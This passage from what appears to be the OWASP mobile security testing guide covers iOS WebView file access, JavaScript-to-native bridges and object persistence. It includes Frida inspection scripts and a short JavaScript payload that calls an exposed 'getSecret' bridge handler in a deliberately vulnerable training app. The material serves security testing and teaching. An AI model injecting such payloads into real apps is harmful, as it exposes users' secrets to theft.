webView.configuration.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
\end{verbatim}

If one or more of the above properties are activated, you should
determine whether they are really necessary for the app to work
properly.

\hypertarget{checking-telephone-number-detection}{%
\subparagraph{Checking Telephone Number
Detection}\label{checking-telephone-number-detection}}

In Safari on iOS, telephone number detection is on by default. However,
you might want to turn it off if your HTML page contains numbers that
can be interpreted as phone numbers, but are not phone numbers, or to
prevent the DOM document from being modified when parsed by the browser.
To turn off telephone number detection in Safari on iOS, use the
format-detection meta tag
(\texttt{\textless{}meta\ name\ =\ "format-detection"\ content\ =\ "telephone=no"\textgreater{}}).
An example of this can be found in the
\href{https://developer.apple.com/library/archive/featuredarticles/iPhoneURLScheme_Reference/PhoneLinks/PhoneLinks.html\#//apple_ref/doc/uid/TP40007899-CH6-SW2}{Apple
developer documenation}. Phone links should be then used
(e.g.~\texttt{\textless{}a\ href="tel:1-408-555-5555"\textgreater{}1-408-555-5555\textless{}/a\textgreater{}})
to explicitly create a link.

\hypertarget{dynamic-analysis-69}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-69}}

If it's possible to load local files via a WebView, the app might be
vulnerable to directory traversal attacks. This would allow access to
all files within the sandbox or even to escape the sandbox with full
access to the file system (if the device is jailbroken). It should
therefore be verified if a user can change the filename or path from
which the file is loaded, and they shouldn't be able to edit the loaded
file.

To simulate an attack, you may inject your own JavaScript into the
WebView with an interception proxy or simply by using dynamic
instrumentation. Attempt to access local storage and any native methods
and properties that might be exposed to the JavaScript context.

In a real-world scenario, JavaScript can only be injected through a
permanent backend Cross-Site Scripting vulnerability or a MITM attack.
See the OWASP \href{https://goo.gl/x1mMMj}{XSS cheat sheet} and the
chapter ``\href{0x06g-Testing-Network-Communication.md}{iOS Network
APIs}'' for more information.

For what concerns this section we will learn about:

\begin{itemize}
\tightlist
\item
  Checking how WebViews are loaded
\item
  Determining WebView file access
\end{itemize}

\hypertarget{checking-how-webviews-are-loaded}{%
\subparagraph{Checking How WebViews are
Loaded}\label{checking-how-webviews-are-loaded}}

As we have seen above in ``Testing How WebViews are Loaded'', if
``scenario 2'' of the WKWebViews is loaded, the app will do so by
calling
\href{https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc}{\texttt{URLForResource:withExtension:}}
and \texttt{loadHTMLString:baseURL}.

To quicky inspect this, you can use frida-trace and trace all
``loadHTMLString'' and ``URLForResource:withExtension:'' methods.

\begin{verbatim}
$ frida-trace -U "Where's My Browser?"
    -m "*[WKWebView *loadHTMLString*]" -m "*[* URLForResource:withExtension:]"

 14131 ms  -[NSBundle URLForResource:0x1c0255390 withExtension:0x0]
 14131 ms  URLForResource: web/WKWebView/scenario2.html
 14131 ms  withExtension: 0x0
 14190 ms  -[WKWebView loadHTMLString:0x1c0255390 baseURL:0x0]
 14190 ms   HTMLString: <!DOCTYPE html>
    <html>
        ...
        </html>

 14190 ms  baseURL: nil
\end{verbatim}

In this case, \texttt{baseURL} is set to \texttt{nil}, meaning that the
effective origin is ``null''. You can obtain the effective origin by
running \texttt{window.origin} from the JavaScript of the page (this app
has an exploitation helper that allows to write and run JavaScript, but
you could also implement a MITM or simply use Frida to inject
JavaScript, e.g.~via \texttt{evaluateJavaScript:completionHandler} of
\texttt{WKWebView}).

As an additional note regarding \texttt{UIWebView}s, if you retrieve the
effective origin from a \texttt{UIWebView} where \texttt{baseURL} is
also set to \texttt{nil} you will see that it is not set to ``null'',
instead you'll obtain something similar to the following:

\begin{verbatim}
applewebdata://5361016c-f4a0-4305-816b-65411fc1d780
\end{verbatim}

This origin ``applewebdata://'' is similar to the ``file://'' origin as
it does not implement Same-Origin Policy and allow access to local files
and any web resources. In this case, it would be better to set
\texttt{baseURL} to ``about:blank'', this way, the Same-Origin Policy
would prevent cross-origin access. However, the recommendation here is
to completely avoid using \texttt{UIWebView}s and go for
\texttt{WKWebView}s instead.

\hypertarget{determining-webview-file-access}{%
\subparagraph{Determining WebView File
Access}\label{determining-webview-file-access}}

Even if not having the original source code, you can quickly determine
if the app's WebViews do allow file access and which kind. For this,
simply navigate to the target WebView in the app and inspect all its
instances, for each of them get the values mentioned in the static
analysis, that is, \texttt{allowFileAccessFromFileURLs} and
\texttt{allowUniversalAccessFromFileURLs}. This only applies to
\texttt{WKWebView}s (\texttt{UIWebVIew}s always allow file access).

We continue with our example using the
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/}{``Where's
My Browser?''} app and Frida REPL, extend the script with the following
content:

\begin{Shaded}
\begin{Highlighting}[]
\VariableTok{ObjC}\NormalTok{.}\AttributeTok{choose}\NormalTok{(}\VariableTok{ObjC}\NormalTok{.}\AttributeTok{classes}\NormalTok{[}\StringTok{\textquotesingle{}WKWebView\textquotesingle{}}\NormalTok{]}\OperatorTok{,} \OperatorTok{\{}
  \DataTypeTok{onMatch}\OperatorTok{:} \KeywordTok{function}\NormalTok{ (wk) }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}onMatch: \textquotesingle{}}\OperatorTok{,}\NormalTok{ wk)}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}URL: \textquotesingle{}}\OperatorTok{,} \VariableTok{wk}\NormalTok{.}\AttributeTok{URL}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}javaScriptEnabled: \textquotesingle{}}\OperatorTok{,} \VariableTok{wk}\NormalTok{.}\AttributeTok{configuration}\NormalTok{().}\AttributeTok{preferences}\NormalTok{().}\AttributeTok{javaScriptEnabled}\NormalTok{())}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}allowFileAccessFromFileURLs: \textquotesingle{}}\OperatorTok{,}
            \VariableTok{wk}\NormalTok{.}\AttributeTok{configuration}\NormalTok{().}\AttributeTok{preferences}\NormalTok{().}\AttributeTok{valueForKey\_}\NormalTok{(}\StringTok{\textquotesingle{}allowFileAccessFromFileURLs\textquotesingle{}}\NormalTok{).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}hasOnlySecureContent: \textquotesingle{}}\OperatorTok{,} \VariableTok{wk}\NormalTok{.}\AttributeTok{hasOnlySecureContent}\NormalTok{().}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}allowUniversalAccessFromFileURLs: \textquotesingle{}}\OperatorTok{,}
            \VariableTok{wk}\NormalTok{.}\AttributeTok{configuration}\NormalTok{().}\AttributeTok{valueForKey\_}\NormalTok{(}\StringTok{\textquotesingle{}allowUniversalAccessFromFileURLs\textquotesingle{}}\NormalTok{).}\AttributeTok{toString}\NormalTok{())}\OperatorTok{;}
  \OperatorTok{\},}
  \DataTypeTok{onComplete}\OperatorTok{:} \KeywordTok{function}\NormalTok{ () }\OperatorTok{\{}
    \VariableTok{console}\NormalTok{.}\AttributeTok{log}\NormalTok{(}\StringTok{\textquotesingle{}done for WKWebView!\textquotesingle{}}\NormalTok{)}\OperatorTok{;}
  \OperatorTok{\}}
\OperatorTok{\}}\NormalTok{)}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

If you run it now, you'll have all the information you need:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ frida }\OperatorTok{{-}}\NormalTok{U }\OperatorTok{{-}}\NormalTok{f }\VariableTok{com}\NormalTok{.}\VariableTok{authenticationfailure}\NormalTok{.}\AttributeTok{WheresMyBrowser} \OperatorTok{{-}}\NormalTok{l }\VariableTok{webviews\_inspector}\NormalTok{.}\AttributeTok{js}

\NormalTok{onMatch}\OperatorTok{:}  \OperatorTok{<}\NormalTok{WKWebView}\OperatorTok{:} \BaseNTok{0x1508b1200}\OperatorTok{;}\NormalTok{ frame }\OperatorTok{=}\NormalTok{ (}\DecValTok{0} \DecValTok{0}\OperatorTok{;} \DecValTok{320} \DecValTok{393}\NormalTok{)}\OperatorTok{;}\NormalTok{ layer }\OperatorTok{=} \OperatorTok{<}\NormalTok{CALayer}\OperatorTok{:} \BaseNTok{0x1c4238f20}\OperatorTok{>>}
\NormalTok{URL}\OperatorTok{:}\NormalTok{  file}\OperatorTok{:}\CommentTok{///var/mobile/Containers/Data/Application/A654D169{-}1DB7{-}429C{-}9DB9{-}A871389A8BAA/}
\NormalTok{        Library}\OperatorTok{/}\NormalTok{WKWebView}\OperatorTok{/}\VariableTok{scenario1}\NormalTok{.}\AttributeTok{html}
\NormalTok{javaScriptEnabled}\OperatorTok{:}  \KeywordTok{true}
\NormalTok{allowFileAccessFromFileURLs}\OperatorTok{:}  \DecValTok{0}
\NormalTok{hasOnlySecureContent}\OperatorTok{:}  \KeywordTok{false}
\NormalTok{allowUniversalAccessFromFileURLs}\OperatorTok{:}  \DecValTok{0}
\end{Highlighting}
\end{Shaded}

Both \texttt{allowFileAccessFromFileURLs} and
\texttt{allowUniversalAccessFromFileURLs} are set to ``0'', meaning that
they are disabled. In this app we can go to the WebView configuration
and enable \texttt{allowFileAccessFromFileURLs}. If we do so and re-run
the script we will see how it is set to ``1'' this time:

\begin{verbatim}
$ frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
...

allowFileAccessFromFileURLs:  1
\end{verbatim}

\hypertarget{determining-whether-native-methods-are-exposed-through-webviews-mstg-platform-7}{%
\subsubsection{Determining Whether Native Methods Are Exposed Through
WebViews
(MSTG-PLATFORM-7)}\label{determining-whether-native-methods-are-exposed-through-webviews-mstg-platform-7}}

\hypertarget{overview-67}{%
\paragraph{Overview}\label{overview-67}}

Since iOS 7, Apple introduced APIs that allow communication between the
JavaScript runtime in the WebView and the native Swift or Objective-C
objects. If these APIs are used carelessly, important functionality
might be exposed to attackers who manage to inject malicious scripts
into the WebView (e.g., through a successful Cross-Site Scripting
attack).

\hypertarget{static-analysis-74}{%
\paragraph{Static Analysis}\label{static-analysis-74}}

Both \texttt{UIWebView} and \texttt{WKWebView} provide a means of
communication between the WebView and the native app. Any important data
or native functionality exposed to the WebView JavaScript engine would
also be accessible to rogue JavaScript running in the WebView.

\hypertarget{testing-uiwebview-javascript-to-native-bridges}{%
\subparagraph{Testing UIWebView JavaScript to Native
Bridges}\label{testing-uiwebview-javascript-to-native-bridges}}

There are two fundamental ways of how native code and JavaScript can
communicate:

\begin{itemize}
\tightlist
\item
  \textbf{JSContext}: When an Objective-C or Swift block is assigned to
  an identifier in a \texttt{JSContext}, JavaScriptCore automatically
  wraps the block in a JavaScript function.
\item
  \textbf{JSExport protocol}: Properties, instance methods and class
  methods declared in a \texttt{JSExport}-inherited protocol are mapped
  to JavaScript objects that are available to all JavaScript code.
  Modifications of objects that are in the JavaScript environment are
  reflected in the native environment.
\end{itemize}

Note that only class members defined in the \texttt{JSExport} protocol
are made accessible to JavaScript code.

Look out for code that maps native objects to the \texttt{JSContext}
associated with a WebView and analyze what functionality it exposes, for
example no sensitive data should be accessible and exposed to WebViews.

In Objective-C, the \texttt{JSContext} associated with a
\texttt{UIWebView} is obtained as follows:

\begin{verbatim}
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
\end{verbatim}

\hypertarget{testing-wkwebview-javascript-to-native-bridges}{%
\subparagraph{Testing WKWebView JavaScript to Native
Bridges}\label{testing-wkwebview-javascript-to-native-bridges}}

JavaScript code in a \texttt{WKWebView} can still send messages back to
the native app but in contrast to \texttt{UIWebView}, it is not possible
to directly reference the \texttt{JSContext} of a \texttt{WKWebView}.
Instead, communication is implemented using a messaging system and using
the \texttt{postMessage} function, which automatically serializes
JavaScript objects into native Objective-C or Swift objects. Message
handlers are configured using the method
\href{https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add}{\texttt{add(\_\ scriptMessageHandler:name:)}}.

Verify if a JavaScript to native bridge exists by searching for
\texttt{WKScriptMessageHandler} and check all exposed methods. Then
verify how the methods are called.

The following example from
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/WKWebViewPreferencesManager.swift\#L98}{``Where's
My Browser?''} demonstrates this.

First we see how the JavaScript bridge is enabled:

\begin{verbatim}
func enableJavaScriptBridge(_ enabled: Bool) {
    options_dict["javaScriptBridge"]?.value = enabled
    let userContentController = wkWebViewConfiguration.userContentController
    userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

    if enabled {
            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
            userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
    }
}
\end{verbatim}

Adding a script message handler with name \texttt{"name"} (or
\texttt{"javaScriptBridge"} in the example above) causes the JavaScript
function
\texttt{window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage}
to be defined in all frames in all web views that use the user content
controller. It can be then
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html\#L33}{used
from the HTML file like this}:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{function} \AttributeTok{invokeNativeOperation}\NormalTok{() }\OperatorTok{\{}
\NormalTok{    value1 }\OperatorTok{=} \VariableTok{document}\NormalTok{.}\AttributeTok{getElementById}\NormalTok{(}\StringTok{"value1"}\NormalTok{).}\AttributeTok{value}
\NormalTok{    value2 }\OperatorTok{=} \VariableTok{document}\NormalTok{.}\AttributeTok{getElementById}\NormalTok{(}\StringTok{"value2"}\NormalTok{).}\AttributeTok{value}
    \VariableTok{window}\NormalTok{.}\VariableTok{webkit}\NormalTok{.}\VariableTok{messageHandlers}\NormalTok{.}\VariableTok{javaScriptBridge}\NormalTok{.}\AttributeTok{postMessage}\NormalTok{([}\StringTok{"multiplyNumbers"}\OperatorTok{,}\NormalTok{ value1}\OperatorTok{,}\NormalTok{ value2])}\OperatorTok{;}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

The called function resides in
\href{https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift\#L29}{\texttt{JavaScriptBridgeMessageHandler.swift}}:

\begin{verbatim}
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

        let arg1 = Double(messageArray[1])!
        let arg2 = Double(messageArray[2])!
        result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
\end{verbatim}

The problem here is that the \texttt{JavaScriptBridgeMessageHandler} not
only contains that function, it also exposes a sensitive function:

\begin{verbatim}
case "getSecret":
        result = "XSRSOGKC342"
\end{verbatim}

\hypertarget{dynamic-analysis-70}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-70}}

At this point you've surely identified all potentially interesting
WebViews in the iOS app and got an overview of the potential attack
surface (via static analysis, the dynamic analysis techniques that we
have seen in previous sections or a combination of them). This would
include HTML and JavaScript files, usage of the \texttt{JSContext} /
\texttt{JSExport} for \texttt{UIWebView} and
\texttt{WKScriptMessageHandler} for \texttt{WKWebView}, as well as which
functions are exposed and present in a WebView.

Further dynamic analysis can help you exploit those functions and get
sensitive data that they might be exposing. As we have seen in the
static analysis, in the previous example it was trivial to get the
secret value by performing reverse engineering (the secret value was
found in plain text inside the source code) but imagine that the exposed
function retrieves the secret from secure storage. In this case, only
dynamic analysis and exploitation would help.

The procedure for exploiting the functions starts with producing a
JavaScript payload and injecting it into the file that the app is
requesting. The injection can be accomplished via various techniques,
for example:

\begin{itemize}
\tightlist
\item
  If some of the content is loaded insecurely from the Internet over
  HTTP (mixed content), you can try to implement a MITM attack.
\item
  You can always perform dynamic instrumentation and inject the
  JavaScript payload by using frameworks like Frida and the
  corresponding JavaScript evaluation functions available for the iOS
  WebViews
  (\href{https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc}{\texttt{stringByEvaluatingJavaScriptFromString:}}
  for \texttt{UIWebView} and
  \href{https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc}{\texttt{evaluateJavaScript:completionHandler:}}
  for \texttt{WKWebView}).
\end{itemize}

In order to get the secret from the previous example of the ``Where's My
Browser?'' app, you can use one of these techniques to inject the
following payload that will reveal the secret by writing it to the
``result'' field of the WebView:

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{function} \AttributeTok{javascriptBridgeCallBack}\NormalTok{(name}\OperatorTok{,}\NormalTok{ value) }\OperatorTok{\{}
    \VariableTok{document}\NormalTok{.}\AttributeTok{getElementById}\NormalTok{(}\StringTok{"result"}\NormalTok{).}\AttributeTok{innerHTML}\OperatorTok{=}\NormalTok{value}\OperatorTok{;}
\OperatorTok{\};}
\VariableTok{window}\NormalTok{.}\VariableTok{webkit}\NormalTok{.}\VariableTok{messageHandlers}\NormalTok{.}\VariableTok{javaScriptBridge}\NormalTok{.}\AttributeTok{postMessage}\NormalTok{([}\StringTok{"getSecret"}\NormalTok{])}\OperatorTok{;}
\end{Highlighting}
\end{Shaded}

Of course, you may also use the Exploitation Helper it provides:

\begin{figure}
\centering
\includegraphics[width=2.60417in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/843077a52818429fe7eadddb9f213dda9441d42b.png}
\caption{Images/Chapters/0x06h/exploit\_javascript\_bridge.png}
\end{figure}

See another example for a vulnerable iOS app and function that is
exposed to a WebView in {[}\#thiel2{]} page 156.

\hypertarget{testing-object-persistence-mstg-platform-8-1}{%
\subsubsection{Testing Object Persistence
(MSTG-PLATFORM-8)}\label{testing-object-persistence-mstg-platform-8-1}}

\hypertarget{overview-68}{%
\paragraph{Overview}\label{overview-68}}

There are several ways to persist an object on iOS:

\hypertarget{object-encoding}{%
\subparagraph{Object Encoding}\label{object-encoding}}

iOS comes with two protocols for object encoding and decoding for
Objective-C or \texttt{NSObject}s: \texttt{NSCoding} and
\texttt{NSSecureCoding}. When a class conforms to either of the
protocols, the data is serialized to \texttt{NSData}: a wrapper for byte
buffers. Note that \texttt{Data} in Swift is the same as \texttt{NSData}
or its mutable counterpart: \texttt{NSMutableData}. The
\texttt{NSCoding} protocol declares the two methods that must be
implemented in order to encode/decode its instance-variables. A class
using \texttt{NSCoding} needs to implement \texttt{NSObject} or be
annotated as an @objc class. The \texttt{NSCoding} protocol requires to
implement encode and init as shown below.

\begin{verbatim}
class CustomPoint: NSObject, NSCoding {

    //required by NSCoding:
    func encode(with aCoder: NSCoder) {
        aCoder.encode(x, forKey: "x")
        aCoder.encode(name, forKey: "name")
    }

    var x: Double = 0.0
    var name: String = ""

    init(x: Double, name: String) {
            self.x = x
            self.name = name
    }

    // required by NSCoding: initialize members using a decoder.
    required convenience init?(coder aDecoder: NSCoder) {
            guard let name = aDecoder.decodeObject(forKey: "name") as? String
                    else {return nil}
            self.init(x:aDecoder.decodeDouble(forKey:"x"),
                                name:name)
    }

    //getters/setters/etc.
}
\end{verbatim}

The issue with \texttt{NSCoding} is that the object is often already
constructed and inserted before you can evaluate the class-type. This
allows an attacker to easily inject all sorts of data. Therefore, the
\texttt{NSSecureCoding} protocol has been introduced. When conforming to
\href{https://developer.apple.com/documentation/foundation/NSSecureCoding}{\texttt{NSSecureCoding}}
you need to include:

\begin{verbatim}
static var supportsSecureCoding: Bool {
        return true
}
\end{verbatim}

when \texttt{init(coder:)} is part of the class. Next, when decoding the
object, a check should be made, e.g.:

\begin{verbatim}
let obj = decoder.decodeObject(of:MyClass.self, forKey: "myKey")
\end{verbatim}

The conformance to \texttt{NSSecureCoding} ensures that objects being
instantiated are indeed the ones that were expected. However, there are
no additional integrity checks done over the data and the data is not
encrypted. Therefore, any secret data needs additional encryption and
data of which the integrity must be protected, should get an additional
HMAC.

Note, when \texttt{NSData} (Objective-C) or the keyword \texttt{let}
(Swift) is used: then the data is immutable in memory and cannot be
easily removed.

\hypertarget{object-archiving-with-nskeyedarchiver}{%
\subparagraph{Object Archiving with
NSKeyedArchiver}\label{object-archiving-with-nskeyedarchiver}}

\texttt{NSKeyedArchiver} is a concrete subclass of \texttt{NSCoder} and
provides a way to encode objects and store them in a file. The
\texttt{NSKeyedUnarchiver} decodes the data and recreates the original
data. Let's take the example of the \texttt{NSCoding} section and now
archive and unarchive them:

\begin{verbatim}
// archiving:
NSKeyedArchiver.archiveRootObject(customPoint, toFile: "/path/to/archive")

// unarchiving:
guard let customPoint = NSKeyedUnarchiver.unarchiveObjectWithFile("/path/to/archive") as?
    CustomPoint else { return nil }
\end{verbatim}

When decoding a keyed archive, because values are requested by name,
values can be decoded out of sequence or not at all. Keyed archives,
therefore, provide better support for forward and backward
compatibility. This means that an archive on disk could actually contain
additional data which is not detected by the program, unless the key for
that given data is provided at a later stage.

Note that additional protection needs to be in place to secure the file
in case of confidential data, as the data is not encrypted within the
file. See the chapter ``\href{0x06d-Testing-Data-Storage.md}{Data
Storage on iOS}'' for more details.

\hypertarget{codable}{%
\subparagraph{Codable}\label{codable}}

With Swift 4, the \texttt{Codable} type alias arrived: it is a
combination of the \texttt{Decodable} and \texttt{Encodable} protocols.
A \texttt{String}, \texttt{Int}, \texttt{Double}, \texttt{Date},
\texttt{Data} and \texttt{URL} are \texttt{Codable} by nature: meaning
they can easily be encoded and decoded without any additional work.
Let's take the following example:

\begin{verbatim}
struct CustomPointStruct:Codable {
    var x: Double
    var name: String
}
\end{verbatim}

By adding \texttt{Codable} to the inheritance list for the
\texttt{CustomPointStruct} in the example, the methods
\texttt{init(from:)} and \texttt{encode(to:)} are automatically
supported. Fore more details about the workings of \texttt{Codable}
check
\href{https://developer.apple.com/documentation/foundation/archives_and_serialization/encoding_and_decoding_custom_types}{the
Apple Developer Documentation}. The \texttt{Codable}s can easily be
encoded / decoded into various representations: \texttt{NSData} using
\texttt{NSCoding}/\texttt{NSSecureCoding}, JSON, Property Lists, XML,
etc. See the subsections below for more details.

\hypertarget{json-and-codable}{%
\subparagraph{JSON and Codable}\label{json-and-codable}}

There are various ways to encode and decode JSON within iOS by using
different 3rd party libraries:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/Mantle/Mantle}{Mantle}
\item
  \href{https://github.com/jsonmodel/jsonmodel}{JSONModel library}
\item
  \href{https://github.com/SwiftyJSON/SwiftyJSON}{SwiftyJSON library}
\item
  \href{https://github.com/Hearst-DD/ObjectMapper}{ObjectMapper library}
\item
  \href{https://github.com/johnezang/JSONKit}{JSONKit}
\item
  \href{https://github.com/JSONModel/JSONModel}{JSONModel}
\item
  \href{https://github.com/ibireme/YYModel}{YYModel}
\item
  \href{https://github.com/ibireme/YYModel}{SBJson 5}
\item
  \href{https://github.com/JohnSundell/Unbox}{Unbox}
\item
  \href{https://github.com/hkellaway/Gloss}{Gloss}
\item
  \href{https://github.com/lyft/mapper}{Mapper}
\item
  \href{https://github.com/delba/JASON}{JASON}
\item
  \href{https://github.com/freshOS/Arrow}{Arrow}
\end{itemize}

The libraries differ in their support for certain versions of Swift and
Objective-C, whether they return (im)mutable results, speed, memory
consumption and actual library size. Again, note in case of
immutability: confidential information cannot be removed from memory
easily.

Next, Apple provides support for JSON encoding/decoding directly by
combining \texttt{Codable} together with a \texttt{JSONEncoder} and a
\texttt{JSONDecoder}:

\begin{verbatim}
struct CustomPointStruct: Codable {
    var point: Double
    var name: String
}

let encoder = JSONEncoder()
encoder.outputFormatting = .prettyPrinted

let test = CustomPointStruct(point: 10, name: "test")
let data = try encoder.encode(test)
let stringData = String(data: data, encoding: .utf8)

// stringData = Optional ({
// "point" : 10,
// "name" : "test"
// })
\end{verbatim}

JSON itself can be stored anywhere, e.g., a (NoSQL) database or a file.
You just need to make sure that any JSON that contains secrets has been
appropriately protected (e.g., encrypted/HMACed). See the chapter
``\href{0x06d-Testing-Data-Storage.md}{Data Storage on iOS}'' for more
details.

\hypertarget{property-lists-and-codable}{%
\subparagraph{Property Lists and
Codable}\label{property-lists-and-codable}}

You can persist objects to \emph{property lists} (also called plists in
previous sections). You can find two examples below of how to use it:

\begin{verbatim}
// archiving:
let data = NSKeyedArchiver.archivedDataWithRootObject(customPoint)
NSUserDefaults.standardUserDefaults().setObject(data, forKey: "customPoint")

// unarchiving:

if let data = NSUserDefaults.standardUserDefaults().objectForKey("customPoint") as? NSData {
    let customPoint = NSKeyedUnarchiver.unarchiveObjectWithData(data)
}
\end{verbatim}

In this first example, the \texttt{NSUserDefaults} are used, which is
the primary \emph{property list}. We can do the same with the
\texttt{Codable} version:

\begin{verbatim}
struct CustomPointStruct: Codable {
        var point: Double
        var name: String
    }

    var points: [CustomPointStruct] = [
        CustomPointStruct(point: 1, name: "test"),
        CustomPointStruct(point: 2, name: "test"),
        CustomPointStruct(point: 3, name: "test"),
    ]

    UserDefaults.standard.set(try? PropertyListEncoder().encode(points), forKey: "points")
    if let data = UserDefaults.standard.value(forKey: "points") as? Data {
        let points2 = try? PropertyListDecoder().decode([CustomPointStruct].self, from: data)
    }
\end{verbatim}

Note that \textbf{\texttt{plist} files are not meant to store secret
information}. They are designed to hold user preferences for an app.

\hypertarget{xml-1}{%
\subparagraph{XML}\label{xml-1}}

There are multiple ways to do XML encoding. Similar to JSON parsing,
there are various third party libraries, such as:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/cezheng/Fuzi}{Fuzi}
\item
  \href{https://github.com/mattt/Ono}{Ono}
\item
  \href{https://github.com/tadija/AEXML}{AEXML}
\item
  \href{https://github.com/ZaBlanc/RaptureXML}{RaptureXML}
\item
  \href{https://github.com/yahoojapan/SwiftyXMLParser}{SwiftyXMLParser}
\item
  \href{https://github.com/drmohundro/SWXMLHash}{SWXMLHash}
\end{itemize}

They vary in terms of speed, memory usage, object persistence and more
important: differ in how they handle XML external entities. See
\href{https://nvd.nist.gov/vuln/detail/CVE-2015-3784}{XXE in the Apple
iOS Office viewer} as an example. Therefore, it is key to disable
external entity parsing if possible. See the
\href{https://goo.gl/86epVd}{OWASP XXE prevention cheatsheet} for more
details. Next to the libraries, you can make use of Apple's
\href{https://developer.apple.com/documentation/foundation/xmlparser}{\texttt{XMLParser}
class}

When not using third party libraries, but Apple's \texttt{XMLParser}, be
sure to let \texttt{shouldResolveExternalEntities} return
\texttt{false}.

\hypertarget{object-relational-mapping-coredata-and-realm}{%
\subparagraph{Object-Relational Mapping (CoreData and
Realm)}\label{object-relational-mapping-coredata-and-realm}}

There are various ORM-like solutions for iOS. The first one is
\href{https://realm.io/docs/swift/latest/}{Realm}, which comes with its
own storage engine. Realm has settings to encrypt the data as explained
in
\href{https://academy.realm.io/posts/tim-oliver-realm-cocoa-tutorial-on-encryption-with-realm/}{Realm's
documentation}. This allows for handling secure data. Note that the
encryption is turned off by default.

Apple itself supplies \texttt{CoreData}, which is well explained in the
\href{https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/CoreData/index.html\#//apple_ref/doc/uid/TP40001075-CH2-SW1,}{Apple
Developer Documentation}. It supports various storage backends as
described in
\href{https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/CoreData/PersistentStoreFeatures.html}{Apple's
Persistent Store Types and Behaviors documentation}. The issue with the
storage backends recommended by Apple, is that none of the type of data
stores is encrypted, nor checked for integrity. Therefore, additional
actions are necessary in case of confidential data. An alternative can
be found in
\href{https://github.com/project-imas/encrypted-core-data}{project
iMas}, which does supply out of the box encryption.

\hypertarget{protocol-buffers-1}{%
\subparagraph{Protocol Buffers}\label{protocol-buffers-1}}

\href{https://developers.google.com/protocol-buffers/}{Protocol Buffers}
by Google, are a platform- and language-neutral mechanism for
serializing structured data by means of the
\href{https://developers.google.com/protocol-buffers/docs/encoding}{Binary
Data Format}. They are available for iOS by means of the
\href{https://github.com/apple/swift-protobuf}{Protobuf} library. There
have been a few vulnerabilities with Protocol Buffers, such as
\href{https://www.cvedetails.com/cve/CVE-2015-5237/}{CVE-2015-5237}.
Note that \textbf{Protocol Buffers do not provide any protection for
confidentiality} as no built-in encryption is available.

\hypertarget{static-analysis-75}{%
\paragraph{Static Analysis}\label{static-analysis-75}}

All different flavors of object persistence share the following
concerns:

\begin{itemize}
\tightlist
\item
  If you use object persistence to store sensitive information on the
  device, then make sure that the data is encrypted: either at the
  database level, or specifically at the value level.
\item
  Need to guarantee the integrity of the information? Use an HMAC
  mechanism or sign the information stored. Always verify the
  HMAC/signature before processing the actual information stored in the
  objects.
\item
  Make sure that keys used in the two notions above are safely stored in
  the KeyChain and well protected. See the chapter
  ``\href{0x06d-Testing-Data-Storage.md}{Data Storage on iOS}'' for more
  details.
\item
  Ensure that the data within the deserialized object is carefully
  validated before it is actively used (e.g., no exploit of
  business/application logic is possible).
\item
  Do not use persistence mechanisms that use
  \href{https://developer.apple.com/library/archive/\#documentation/Cocoa/Reference/ObjCRuntimeRef/Reference/reference.html}{Runtime
  Reference} to serialize/deserialize objects in high-risk applications,
  as the attacker might be able to manipulate the steps to execute
  business logic via this mechanism (see the chapter
  ``\href{0x06j-Testing-Resiliency-Against-Reverse-Engineering.md}{iOS
  Anti-Reversing Defenses}'' for more details).
\item
  Note that in Swift 2 and beyond, a
  \href{https://developer.apple.com/documentation/swift/mirror}{Mirror}
  can be used to read parts of an object, but cannot be used to write
  against the object.
\end{itemize}

\hypertarget{dynamic-analysis-71}{%
